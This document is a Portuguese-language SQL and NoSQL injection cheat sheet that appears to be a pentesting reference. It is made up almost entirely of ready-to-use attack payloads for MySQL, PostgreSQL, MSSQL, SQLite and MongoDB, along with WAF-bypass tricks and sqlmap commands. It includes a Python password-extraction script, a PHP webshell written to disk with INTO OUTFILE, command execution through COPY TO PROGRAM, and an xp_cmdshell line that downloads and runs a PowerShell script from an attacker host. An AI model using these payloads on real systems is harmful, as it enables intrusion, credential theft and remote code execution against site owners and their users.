---
title: "SQLi Cheatsheet"
---

# SQLi Cheatsheet - Referência Rápida

## Como Usar Este Cheatsheet

SQL Injection nao e um ataque uniforme — o payload correto depende do banco de dados alvo, do contexto de injecao, e do que o servidor retorna. Use este cheatsheet em sequencia: detectar primeiro, identificar o banco, depois escolher a tecnica adequada baseada no que a aplicacao exibe.

**Quando usar cada tecnica:**

| Tecnica | Quando usar | O que precisa |
|---|---|---|
| UNION-based | Resposta da query e refletida na pagina | Mesmo numero de colunas; tipo compativel |
| Error-based | Mensagens de erro do banco aparecem na resposta | Funcoes que forcam erro com dado embutido |
| Blind Boolean | Resposta muda (tamanho, conteudo) entre true/false | Diferenca observavel entre respostas |
| Blind Time-based | Nenhuma diferenca na resposta (out-of-band) | SLEEP/WAITFOR executado pelo banco |
| Stacked Queries | Multiplos statements aceitos | Banco e driver suportam multi-statement |
| Out-of-file | Banco tem privilegio FILE | INTO OUTFILE, LOAD_FILE disponiveis |

**Fluxo de investigacao:**

1. Detectar: injetar `'` e observar erro ou comportamento diferente
2. Identificar banco: versao, comentarios diferentes por banco
3. Escolher tecnica: union (saida visivel) -> error -> boolean -> time
4. Enumerar: bancos -> tabelas -> colunas -> dados
5. Escalar: FILE privilege? xp_cmdshell? COPY TO PROGRAM?

**Contextos de injecao alem de parametros GET:**

SQLi ocorre em qualquer dado que chega ao banco — cookies, headers HTTP (User-Agent, X-Forwarded-For, Referer), corpo de requisicao JSON, campos de busca, campos de ordenacao (ORDER BY), e second-order (dado armazenado que e usado em query posterior).

---

## Detecção Inicial

```sql
-- Caracteres de teste para detecção
'
''
`
`)
'))
-- 
/*
#
;

-- Payloads booleanos básicos
' OR 1=1--
' OR '1'='1
' AND 1=1--
' AND 1=2--
admin'--
admin' #
' OR 1=1#
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2

-- Testar erros
'
1'
1''
1\
1%27
%27
```

---

## MySQL

### Comentários

```sql
-- comentário
# comentário
/* comentário */
/*!comentário*/         -- Comentário especial (executado pelo MySQL)
```

### Enumeração de Banco de Dados

```sql
-- Versão
SELECT @@version
SELECT version()

-- Banco atual
SELECT database()
SELECT schema()

-- Usuário atual
SELECT user()
SELECT current_user()
SELECT system_user()

-- Listar bancos
SELECT schema_name FROM information_schema.schemata

-- Listar tabelas (banco atual)
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Listar tabelas (banco específico)
SELECT table_name FROM information_schema.tables WHERE table_schema='alvo'

-- Listar colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Listar tudo de uma vez
SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','performance_schema','sys','mysql')
```

### UNION-Based

```sql
-- Descobrir número de colunas
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--          -- Erro = número de colunas é 2

-- Alternativa
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--

-- Encontrar coluna com dado visível
UNION SELECT 1,2,3--
UNION SELECT NULL,NULL,'test'--

-- Extrair dados
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- Concatenar múltiplos valores em um campo
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),2,3 FROM users--
```

### Error-Based

```sql
-- extractvalue()
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--

-- updatexml()
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--

-- floor()
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Blind Boolean-Based

```sql
-- Template básico
' AND (condição)-- 
-- True = resultado normal, False = resultado diferente

-- Verificar versão character by character
' AND SUBSTRING(version(),1,1)='5'--
' AND SUBSTRING(version(),1,1)='8'--

-- Extrair dado com SUBSTRING
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='p'--

-- Com ASCII (mais confiável para binário)
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=112--

-- Verificar tamanho antes de extrair
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10--
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32--
```

### Blind Time-Based

```sql
-- MySQL: SLEEP()
' AND SLEEP(5)--
' IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(version(),1,1)='8', SLEEP(5), 0)--

-- Extrair dado via timing
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50, SLEEP(3), 0)--
```

### Leitura e Escrita de Arquivos

```sql
-- Ler arquivo (requer FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3--

-- Escrever webshell (requer write permission + INTO OUTFILE)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Verificar se INTO OUTFILE funciona
' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'--
```

---

## PostgreSQL

```sql
-- Versão
SELECT version()

-- Banco atual
SELECT current_database()

-- Usuário
SELECT current_user

-- Listar bancos
SELECT datname FROM pg_database

-- Listar tabelas
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Listar colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Time-based
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- Error-based
' AND 1=CAST(version() AS INTEGER)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--

-- Stack queries (quando habilitado)
'; INSERT INTO users VALUES ('hacker','hacked')--

-- Ler arquivos
' UNION SELECT pg_read_file('/etc/passwd',0,200)--

-- Executar comandos (COPY TO/FROM PROGRAM)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--
'; CREATE TABLE cmd_output(data text); COPY cmd_output FROM PROGRAM 'id'--
'; SELECT data FROM cmd_output--
```

---

## MSSQL (Microsoft SQL Server)

```sql
-- Versão
SELECT @@version

-- Banco atual
SELECT DB_NAME()

-- Usuário
SELECT SYSTEM_USER
SELECT USER_NAME()

-- Listar bancos
SELECT name FROM master.dbo.sysdatabases

-- Listar tabelas
SELECT name FROM sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables

-- Time-based
'; WAITFOR DELAY '0:0:5'--
' AND 1=1; WAITFOR DELAY '0:0:5'--

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--

-- Stacked queries
'; SELECT 1--
'; INSERT INTO users VALUES ('hacker','hacked')--

-- xp_cmdshell (RCE quando habilitado)
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"')--

-- Habilitar xp_cmdshell (requer sysadmin)
'; EXEC sp_configure 'show advanced options',1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1--
'; RECONFIGURE--
```

---

## SQLite

```sql
-- Versão
SELECT sqlite_version()

-- Listar tabelas
SELECT name FROM sqlite_master WHERE type='table'

-- Listar esquema
SELECT sql FROM sqlite_master WHERE name='users'

-- Sem sleep nativo, usar RANDOMBLOB para timing (impreciso)
' AND 1=(SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END)--

-- Ler arquivo (apenas SQLite 3.x com extensão)
' UNION SELECT readfile('/etc/passwd')--
```

---

## NoSQL Injection (MongoDB)

```javascript
// Bypass de login - parâmetros JSON
{"username": {"$ne": null}, "password": {"$ne": null}}

// Operadores NoSQL úteis
{"$gt": ""}    // greater than empty string = sempre true
{"$lt": "z"}   // less than 'z' = true para maioria
{"$ne": null}  // not equal null = true se existe
{"$regex": ".*"}  // regex match all

// Via URL parameters
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username=admin&password[$ne]=wrongpassword

// Enumeração de dados com $regex
{"username": "admin", "password": {"$regex": "^a"}}  // senha começa com 'a'?
{"username": "admin", "password": {"$regex": "^ab"}} // começa com 'ab'?

// Script Python para extração
import requests
TARGET = "http://TARGET/api/login"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789@!#$%"
password = ""
while True:
    found = False
    for c in CHARSET:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(TARGET, json=payload)
        if "success" in r.text or r.status_code == 200:
            password += c
            found = True
            break
    if not found:
        break
print(f"Senha: {password}")
```

---

## WAF Bypass

```sql
-- Encoding
%27          -- URL encode de '
%2527        -- Double URL encode
%u0027       -- Unicode
0x27         -- Hex

-- Case variation
SeLeCt, uNiOn, wHeRe

-- Comentários para quebrar palavras-chave
UN/**/ION SEL/**/ECT
UN--
ION SEL--
ECT

-- Inline comments
/*!UNION*/
/*!SELECT*/
/*!50000SELECT*/   -- Executado em MySQL 5.00.00+

-- Whitespace alternatives
UNION%09SELECT    -- Tab
UNION%0ASELECT    -- Newline
UNION%0DSELECT    -- Carriage return
UNION%0CSELECT    -- Form feed

-- Concatenação de strings para bypass de filtros de keywords
-- MySQL:
SELECT CONCAT('ad','min')
-- MSSQL:
SELECT 'ad'+'min'
-- Oracle:
SELECT 'ad'||'min'

-- Operadores alternativos
AND = &&
OR  = ||
= (igual) pode usar LIKE

-- Bypass de filtragem de espaços
SELECT(username)FROM(users)WHERE(username)LIKE('admin')
```

---

## Injeção em Diferentes Contextos

```sql
-- Em JSON body (APIs)
{"id": "1 UNION SELECT username,password,3 FROM users--"}
{"id": "1'"}      -- Detectar se é vulnerável

-- Em headers HTTP
Cookie: session=1' AND SLEEP(3)--
X-Forwarded-For: 1' AND SLEEP(3)--
User-Agent: ' UNION SELECT 1,2,3--

-- Em campos de busca
search=test' UNION SELECT 1,2,3--
q=' OR 1=1--

-- Second-order (armazenada, disparada depois)
-- Injetar: admin'--
-- Depois: UPDATE users SET password=X WHERE username='admin'--'

-- Em ORDER BY (não aceita UNION, só boolean)
1 AND 1=1
1 AND 1=2
1 ASC, SLEEP(3)--
(CASE WHEN (1=1) THEN id ELSE id*1000000 END)
```

---

## Automação com sqlmap

```bash
# Básico
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# Com cookie de autenticação
sqlmap -u "http://TARGET/page?id=1" \
       --cookie="session=abc123" \
       --batch --dbs

# Em body POST
sqlmap -u "http://TARGET/login" \
       --data="username=admin&password=test" \
       --batch --dbs

# Em body JSON (API)
sqlmap -u "http://TARGET/api/users" \
       --data='{"id": "1"}' \
       --headers="Content-Type: application/json" \
       --batch --dbs

# Via Burp request file
sqlmap -r request.txt --batch --dbs

# Técnicas específicas
sqlmap -u "URL" -p id --technique=B    # Blind boolean
sqlmap -u "URL" -p id --technique=T    # Time-based
sqlmap -u "URL" -p id --technique=E    # Error-based
sqlmap -u "URL" -p id --technique=U    # Union-based
sqlmap -u "URL" -p id --technique=S    # Stacked

# Extrair tudo
sqlmap -u "URL" --batch -D alvo -T users -C username,password --dump

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,between,randomcase
sqlmap -u "URL" --random-agent --level=5 --risk=3
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"   # Via Burp

# Tampers úteis
# space2comment   -> UNION/**/SELECT
# between         -> > 1 -> NOT BETWEEN 0 AND 1
# randomcase      -> SeLeCt
# charencode      -> %27
# base64encode    -> base64 encode
# equaltolike     -> = -> LIKE
```

---

## Referência Rápida de Funções Úteis

| Função | MySQL | PostgreSQL | MSSQL | SQLite |
|--------|-------|-----------|-------|--------|
| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| Concatenar | `CONCAT(a,b)` ou `a,b` | `a\|\|b` | `a+b` | `a\|\|b` |
| Tamanho | `LENGTH(s)` | `LENGTH(s)` | `LEN(s)` | `LENGTH(s)` |
| ASCII | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `UNICODE(c)` |
| Char | `CHAR(65)` | `CHR(65)` | `CHAR(65)` | `CHAR(65)` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | N/A |
| Null coalesce | `IFNULL(a,b)` | `COALESCE(a,b)` | `ISNULL(a,b)` | `IFNULL(a,b)` |
| Condicional | `IF(c,a,b)` | `CASE WHEN c THEN a ELSE b END` | `IIF(c,a,b)` | `CASE WHEN` |
| Versão | `@@version` | `version()` | `@@version` | `sqlite_version()` |
| DB atual | `database()` | `current_database()` | `DB_NAME()` | N/A |
| Usuário | `user()` | `current_user` | `SYSTEM_USER` | N/A |
